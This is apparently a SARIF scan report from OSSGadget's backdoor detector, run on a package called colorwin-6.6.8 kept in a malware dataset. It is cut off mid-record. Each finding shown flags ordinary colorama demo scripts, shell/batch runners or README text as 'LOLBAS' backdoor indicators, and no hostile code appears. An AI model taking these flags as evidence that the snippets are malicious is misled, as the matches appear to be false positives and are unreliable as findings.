{
  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "oss-detect-backdoor",
          "organization": "Microsoft Corporation",
          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
          "version": "0.1.428+ed0e2cfe6a"
        }
      },
      "results": [
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/demos/demo05.py"
                },
                "region": {
                  "startLine": 22,
                  "startColumn": 16,
                  "endLine": 22,
                  "endColumn": 21,
                  "snippet": {
                    "text": "print('%sUnwrapped RED going to stdout, via the default print function.' % Fore.RED)\n\ninit()\nprint('%sWrapped RED going to stdout, via the default print function.' % Fore.RED)\n",
                    "rendered": {
                      "text": "print('%sUnwrapped RED going to stdout, via the default print function.' % Fore.RED)\n\ninit()\nprint('%sWrapped RED going to stdout, via the default print function.' % Fore.RED)\n",
                      "markdown": "`print('%sUnwrapped RED going to stdout, via the default print function.' % Fore.RED)\n\ninit()\nprint('%sWrapped RED going to stdout, via the default print function.' % Fore.RED)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/demos/demo05.py"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 18,
                  "endLine": 19,
                  "endColumn": 23,
                  "snippet": {
                    "text": "init(wrap=False)\nprint('%sUnwrapped CYAN going to stdout, via the default print function.' % Fore.CYAN)\nprint('%sUnwrapped CYAN, using the file parameter to write via colorama the AnsiToWin32 function.' % Fore.CYAN, file=AnsiToWin32(sys.stdout))\nprint('%sUnwrapped RED going to stdout, via the default print function.' % Fore.RED)\n\ninit()\nprint('%sWrapped RED going to stdout, via the default print function.' % Fore.RED)\n",
                    "rendered": {
                      "text": "init(wrap=False)\nprint('%sUnwrapped CYAN going to stdout, via the default print function.' % Fore.CYAN)\nprint('%sUnwrapped CYAN, using the file parameter to write via colorama the AnsiToWin32 function.' % Fore.CYAN, file=AnsiToWin32(sys.stdout))\nprint('%sUnwrapped RED going to stdout, via the default print function.' % Fore.RED)\n\ninit()\nprint('%sWrapped RED going to stdout, via the default print function.' % Fore.RED)\n",
                      "markdown": "`init(wrap=False)\nprint('%sUnwrapped CYAN going to stdout, via the default print function.' % Fore.CYAN)\nprint('%sUnwrapped CYAN, using the file parameter to write via colorama the AnsiToWin32 function.' % Fore.CYAN, file=AnsiToWin32(sys.stdout))\nprint('%sUnwrapped RED going to stdout, via the default print function.' % Fore.RED)\n\ninit()\nprint('%sWrapped RED going to stdout, via the default print function.' % Fore.RED)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/demos/demo.bat"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 50,
                  "endLine": 29,
                  "endColumn": 54,
                  "snippet": {
                    "text": ":: Demonstrate the difference between colorama initialized with wrapping on and off.\npython demo05.py\n\n:: Demonstrate printing colored, random characters at random positions on the screen\npython demo06.py\n\n:: Demonstrate cursor relative movement: UP, DOWN, FORWARD, and BACK in colorama.CURSOR\n",
                    "rendered": {
                      "text": ":: Demonstrate the difference between colorama initialized with wrapping on and off.\npython demo05.py\n\n:: Demonstrate printing colored, random characters at random positions on the screen\npython demo06.py\n\n:: Demonstrate cursor relative movement: UP, DOWN, FORWARD, and BACK in colorama.CURSOR\n",
                      "markdown": "`:: Demonstrate the difference between colorama initialized with wrapping on and off.\npython demo05.py\n\n:: Demonstrate printing colored, random characters at random positions on the screen\npython demo06.py\n\n:: Demonstrate cursor relative movement: UP, DOWN, FORWARD, and BACK in colorama.CURSOR\n`"
                    }
                  },
                  "sourceLanguage": "wincmdscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/demos/demo.bat"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 19,
                  "endLine": 8,
                  "endColumn": 25,
                  "snippet": {
                    "text": ":: This demo is also used to verify correctness visually, because we don't\n:: have automated tests.\n\n:: Implemented as a bash script which invokes python so that we can test the\n:: behaviour on exit, which resets default colors again.\n\n:: print grid of all colors and brightnesses\n",
                    "rendered": {
                      "text": ":: This demo is also used to verify correctness visually, because we don't\n:: have automated tests.\n\n:: Implemented as a bash script which invokes python so that we can test the\n:: behaviour on exit, which resets default colors again.\n\n:: print grid of all colors and brightnesses\n",
                      "markdown": "`:: This demo is also used to verify correctness visually, because we don't\n:: have automated tests.\n\n:: Implemented as a bash script which invokes python so that we can test the\n:: behaviour on exit, which resets default colors again.\n\n:: print grid of all colors and brightnesses\n`"
                    }
                  },
                  "sourceLanguage": "wincmdscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/demos/demo.bat"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 77,
                  "endLine": 30,
                  "snippet": {
                    "text": ":: Demonstrate the difference between colorama initialized with wrapping on and off.\npython demo05.py\n\n:: Demonstrate printing colored, random characters at random positions on the screen\npython demo06.py\n\n:: Demonstrate cursor relative movement: UP, DOWN, FORWARD, and BACK in colorama.CURSOR\npython demo07.py\n",
                    "rendered": {
                      "text": ":: Demonstrate the difference between colorama initialized with wrapping on and off.\npython demo05.py\n\n:: Demonstrate printing colored, random characters at random positions on the screen\npython demo06.py\n\n:: Demonstrate cursor relative movement: UP, DOWN, FORWARD, and BACK in colorama.CURSOR\npython demo07.py\n",
                      "markdown": "`:: Demonstrate the difference between colorama initialized with wrapping on and off.\npython demo05.py\n\n:: Demonstrate printing colored, random characters at random positions on the screen\npython demo06.py\n\n:: Demonstrate cursor relative movement: UP, DOWN, FORWARD, and BACK in colorama.CURSOR\npython demo07.py\n`"
                    }
                  },
                  "sourceLanguage": "wincmdscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/demos/demo.bat"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 19,
                  "endLine": 8,
                  "endColumn": 25,
                  "snippet": {
                    "text": ":: This demo is also used to verify correctness visually, because we don't\n:: have automated tests.\n\n:: Implemented as a bash script which invokes python so that we can test the\n:: behaviour on exit, which resets default colors again.\n\n:: print grid of all colors and brightnesses\n",
                    "rendered": {
                      "text": ":: This demo is also used to verify correctness visually, because we don't\n:: have automated tests.\n\n:: Implemented as a bash script which invokes python so that we can test the\n:: behaviour on exit, which resets default colors again.\n\n:: print grid of all colors and brightnesses\n",
                      "markdown": "`:: This demo is also used to verify correctness visually, because we don't\n:: have automated tests.\n\n:: Implemented as a bash script which invokes python so that we can test the\n:: behaviour on exit, which resets default colors again.\n\n:: print grid of all colors and brightnesses\n`"
                    }
                  },
                  "sourceLanguage": "wincmdscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/demos/demo.bat"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 2,
                  "endLine": 3,
                  "endColumn": 10,
                  "snippet": {
                    "text": ":: Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.\n\n:: Script to demonstrate features of colorama.\n\n:: This demo is also used to verify correctness visually, because we don't\n:: have automated tests.\n",
                    "rendered": {
                      "text": ":: Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.\n\n:: Script to demonstrate features of colorama.\n\n:: This demo is also used to verify correctness visually, because we don't\n:: have automated tests.\n",
                      "markdown": "`:: Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.\n\n:: Script to demonstrate features of colorama.\n\n:: This demo is also used to verify correctness visually, because we don't\n:: have automated tests.\n`"
                    }
                  },
                  "sourceLanguage": "wincmdscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/demos/demo06.py"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 49,
                  "endLine": 9,
                  "endColumn": 53,
                  "snippet": {
                    "text": "from random import randint, choice\nfrom string import printable\n\n# Demonstrate printing colored, random characters at random positions on the screen\n\n# Fore, Back and Style are convenience classes for the constant ANSI strings that set\n#     the foreground, background and style. The don't have any magic of their own.\n",
                    "rendered": {
                      "text": "from random import randint, choice\nfrom string import printable\n\n# Demonstrate printing colored, random characters at random positions on the screen\n\n# Fore, Back and Style are convenience classes for the constant ANSI strings that set\n#     the foreground, background and style. The don't have any magic of their own.\n",
                      "markdown": "`from random import randint, choice\nfrom string import printable\n\n# Demonstrate printing colored, random characters at random positions on the screen\n\n# Fore, Back and Style are convenience classes for the constant ANSI strings that set\n#     the foreground, background and style. The don't have any magic of their own.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/demos/demo06.py"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 76,
                  "endLine": 10,
                  "snippet": {
                    "text": "from random import randint, choice\nfrom string import printable\n\n# Demonstrate printing colored, random characters at random positions on the screen\n\n# Fore, Back and Style are convenience classes for the constant ANSI strings that set\n#     the foreground, background and style. The don't have any magic of their own.\nFORES = [ Fore.BLACK, Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE ]\n",
                    "rendered": {
                      "text": "from random import randint, choice\nfrom string import printable\n\n# Demonstrate printing colored, random characters at random positions on the screen\n\n# Fore, Back and Style are convenience classes for the constant ANSI strings that set\n#     the foreground, background and style. The don't have any magic of their own.\nFORES = [ Fore.BLACK, Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE ]\n",
                      "markdown": "`from random import randint, choice\nfrom string import printable\n\n# Demonstrate printing colored, random characters at random positions on the screen\n\n# Fore, Back and Style are convenience classes for the constant ANSI strings that set\n#     the foreground, background and style. The don't have any magic of their own.\nFORES = [ Fore.BLACK, Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE ]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/demos/demo.sh"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 18,
                  "endLine": 9,
                  "endColumn": 24,
                  "snippet": {
                    "text": "# This demo is also used to verify correctness visually, because we don't have\n# automated tests.\n\n# Implemented as a bash script which invokes python so that we can test the\n# behaviour on exit, which resets default colors again.\n\n# print grid of all colors and brightnesses\n",
                    "rendered": {
                      "text": "# This demo is also used to verify correctness visually, because we don't have\n# automated tests.\n\n# Implemented as a bash script which invokes python so that we can test the\n# behaviour on exit, which resets default colors again.\n\n# print grid of all colors and brightnesses\n",
                      "markdown": "`# This demo is also used to verify correctness visually, because we don't have\n# automated tests.\n\n# Implemented as a bash script which invokes python so that we can test the\n# behaviour on exit, which resets default colors again.\n\n# print grid of all colors and brightnesses\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/demos/demo.sh"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 14,
                  "endLine": 2,
                  "snippet": {
                    "text": "#!/usr/bin/env bash\n# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.\n\n# Script to demonstrate features of colorama.\n\n",
                    "rendered": {
                      "text": "#!/usr/bin/env bash\n# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.\n\n# Script to demonstrate features of colorama.\n\n",
                      "markdown": "`#!/usr/bin/env bash\n# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.\n\n# Script to demonstrate features of colorama.\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/demos/demo.sh"
                },
                "region": {
                  "startLine": 23,
                  "startColumn": 30,
                  "endLine": 24,
                  "endColumn": 4,
                  "snippet": {
                    "text": "\n# check that stripped ANSI in redirected stderr does not affect stdout\nrm -f demo04.out\npython demo04.py 2> demo04.out\ncat demo04.out\nrm -f demo04.out\n\n# Demonstrate the difference between colorama initialized with wrapping on and off.\n",
                    "rendered": {
                      "text": "\n# check that stripped ANSI in redirected stderr does not affect stdout\nrm -f demo04.out\npython demo04.py 2> demo04.out\ncat demo04.out\nrm -f demo04.out\n\n# Demonstrate the difference between colorama initialized with wrapping on and off.\n",
                      "markdown": "`\n# check that stripped ANSI in redirected stderr does not affect stdout\nrm -f demo04.out\npython demo04.py 2> demo04.out\ncat demo04.out\nrm -f demo04.out\n\n# Demonstrate the difference between colorama initialized with wrapping on and off.\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/demos/demo.sh"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 18,
                  "endLine": 9,
                  "endColumn": 24,
                  "snippet": {
                    "text": "# This demo is also used to verify correctness visually, because we don't have\n# automated tests.\n\n# Implemented as a bash script which invokes python so that we can test the\n# behaviour on exit, which resets default colors again.\n\n# print grid of all colors and brightnesses\n",
                    "rendered": {
                      "text": "# This demo is also used to verify correctness visually, because we don't have\n# automated tests.\n\n# Implemented as a bash script which invokes python so that we can test the\n# behaviour on exit, which resets default colors again.\n\n# print grid of all colors and brightnesses\n",
                      "markdown": "`# This demo is also used to verify correctness visually, because we don't have\n# automated tests.\n\n# Implemented as a bash script which invokes python so that we can test the\n# behaviour on exit, which resets default colors again.\n\n# print grid of all colors and brightnesses\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/demos/demo.sh"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 1,
                  "endLine": 4,
                  "endColumn": 9,
                  "snippet": {
                    "text": "#!/usr/bin/env bash\n# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.\n\n# Script to demonstrate features of colorama.\n\n# This demo is also used to verify correctness visually, because we don't have\n# automated tests.\n",
                    "rendered": {
                      "text": "#!/usr/bin/env bash\n# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.\n\n# Script to demonstrate features of colorama.\n\n# This demo is also used to verify correctness visually, because we don't have\n# automated tests.\n",
                      "markdown": "`#!/usr/bin/env bash\n# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.\n\n# Script to demonstrate features of colorama.\n\n# This demo is also used to verify correctness visually, because we don't have\n# automated tests.\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/demos/demo.sh"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 14,
                  "endLine": 2,
                  "snippet": {
                    "text": "#!/usr/bin/env bash\n# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.\n\n# Script to demonstrate features of colorama.\n\n",
                    "rendered": {
                      "text": "#!/usr/bin/env bash\n# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.\n\n# Script to demonstrate features of colorama.\n\n",
                      "markdown": "`#!/usr/bin/env bash\n# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.\n\n# Script to demonstrate features of colorama.\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/README.rst"
                },
                "region": {
                  "startLine": 360,
                  "startColumn": 7,
                  "endLine": 360,
                  "endColumn": 11,
                  "snippet": {
                    "text": "* User 'eryksun', for guidance on correctly instantiating ``ctypes.windll``.\n* Matthew McCormick for politely pointing out a longstanding crash on non-Win.\n* Ben Hoyt, for a magnificent fix under 64-bit Windows.\n* Jesse at Empty Square for submitting a fix for examples in the README.\n* User 'jamessp', an observant documentation fix for cursor positioning.\n* User 'vaal1239', Dave Mckee & Lackner Kristof for a tiny but much-needed Win7\n  fix.\n",
                    "rendered": {
                      "text": "* User 'eryksun', for guidance on correctly instantiating ``ctypes.windll``.\n* Matthew McCormick for politely pointing out a longstanding crash on non-Win.\n* Ben Hoyt, for a magnificent fix under 64-bit Windows.\n* Jesse at Empty Square for submitting a fix for examples in the README.\n* User 'jamessp', an observant documentation fix for cursor positioning.\n* User 'vaal1239', Dave Mckee & Lackner Kristof for a tiny but much-needed Win7\n  fix.\n",
                      "markdown": "`* User 'eryksun', for guidance on correctly instantiating ``ctypes.windll``.\n* Matthew McCormick for politely pointing out a longstanding crash on non-Win.\n* Ben Hoyt, for a magnificent fix under 64-bit Windows.\n* Jesse at Empty Square for submitting a fix for examples in the README.\n* User 'jamessp', an observant documentation fix for cursor positioning.\n* User 'vaal1239', Dave Mckee & Lackner Kristof for a tiny but much-needed Win7\n  fix.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/README.rst"
                },
                "region": {
                  "startLine": 274,
                  "startColumn": 37,
                  "endLine": 274,
                  "endColumn": 41,
                  "snippet": {
                    "text": "\n    # cursor positioning\n    ESC [ y;x H     # position cursor at x across, y down\n    ESC [ y;x f     # position cursor at x across, y down\n    ESC [ n A       # move cursor n lines up\n    ESC [ n B       # move cursor n lines down\n    ESC [ n C       # move cursor n characters forward\n",
                    "rendered": {
                      "text": "\n    # cursor positioning\n    ESC [ y;x H     # position cursor at x across, y down\n    ESC [ y;x f     # position cursor at x across, y down\n    ESC [ n A       # move cursor n lines up\n    ESC [ n B       # move cursor n lines down\n    ESC [ n C       # move cursor n characters forward\n",
                      "markdown": "`\n    # cursor positioning\n    ESC [ y;x H     # position cursor at x across, y down\n    ESC [ y;x f     # position cursor at x across, y down\n    ESC [ n A       # move cursor n lines up\n    ESC [ n B       # move cursor n lines down\n    ESC [ n C       # move cursor n characters forward\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/README.rst"
                },
                "region": {
                  "startLine": 273,
                  "startColumn": 37,
                  "endLine": 273,
                  "endColumn": 41,
                  "snippet": {
                    "text": "    ESC [ 49 m      # reset\n\n    # cursor positioning\n    ESC [ y;x H     # position cursor at x across, y down\n    ESC [ y;x f     # position cursor at x across, y down\n    ESC [ n A       # move cursor n lines up\n    ESC [ n B       # move cursor n lines down\n",
                    "rendered": {
                      "text": "    ESC [ 49 m      # reset\n\n    # cursor positioning\n    ESC [ y;x H     # position cursor at x across, y down\n    ESC [ y;x f     # position cursor at x across, y down\n    ESC [ n A       # move cursor n lines up\n    ESC [ n B       # move cursor n lines down\n",
                      "markdown": "`    ESC [ 49 m      # reset\n\n    # cursor positioning\n    ESC [ y;x H     # position cursor at x across, y down\n    ESC [ y;x f     # position cursor at x across, y down\n    ESC [ n A       # move cursor n lines up\n    ESC [ n B       # move cursor n lines down\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/README.rst"
                },
                "region": {
                  "startLine": 186,
                  "startColumn": 11,
                  "endLine": 186,
                  "endColumn": 15,
                  "snippet": {
                    "text": "\ninit(autoreset=False):\n    If you find yourself repeatedly sending reset sequences to turn off color\n    changes at the end of every print, then ``init(autoreset=True)`` will\n    automate that:\n\n    .. code-block:: python\n",
                    "rendered": {
                      "text": "\ninit(autoreset=False):\n    If you find yourself repeatedly sending reset sequences to turn off color\n    changes at the end of every print, then ``init(autoreset=True)`` will\n    automate that:\n\n    .. code-block:: python\n",
                      "markdown": "`\ninit(autoreset=False):\n    If you find yourself repeatedly sending reset sequences to turn off color\n    changes at the end of every print, then ``init(autoreset=True)`` will\n    automate that:\n\n    .. code-block:: python\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/README.rst"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 15,
                  "endLine": 38,
                  "snippet": {
                    "text": "\nNo requirements other than the standard library.\n\n.. code-block:: bash\n\n    pip install colorama\n    # or\n    conda install -c anaconda colorama\n",
                    "rendered": {
                      "text": "\nNo requirements other than the standard library.\n\n.. code-block:: bash\n\n    pip install colorama\n    # or\n    conda install -c anaconda colorama\n",
                      "markdown": "`\nNo requirements other than the standard library.\n\n.. code-block:: bash\n\n    pip install colorama\n    # or\n    conda install -c anaconda colorama\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/README.rst"
                },
                "region": {
                  "startLine": 281,
                  "startColumn": 31,
                  "endLine": 282,
                  "snippet": {
                    "text": "    ESC [ n D       # move cursor n characters backward\n\n    # clear the screen\n    ESC [ mode J    # clear the screen\n\n    # clear the line\n    ESC [ mode K    # clear the line\n\n",
                    "rendered": {
                      "text": "    ESC [ n D       # move cursor n characters backward\n\n    # clear the screen\n    ESC [ mode J    # clear the screen\n\n    # clear the line\n    ESC [ mode K    # clear the line\n\n",
                      "markdown": "`    ESC [ n D       # move cursor n characters backward\n\n    # clear the screen\n    ESC [ mode J    # clear the screen\n\n    # clear the line\n    ESC [ mode K    # clear the line\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/README.rst"
                },
                "region": {
                  "startLine": 280,
                  "startColumn": 15,
                  "endLine": 281,
                  "snippet": {
                    "text": "    ESC [ n C       # move cursor n characters forward\n    ESC [ n D       # move cursor n characters backward\n\n    # clear the screen\n    ESC [ mode J    # clear the screen\n\n    # clear the line\n    ESC [ mode K    # clear the line\n",
                    "rendered": {
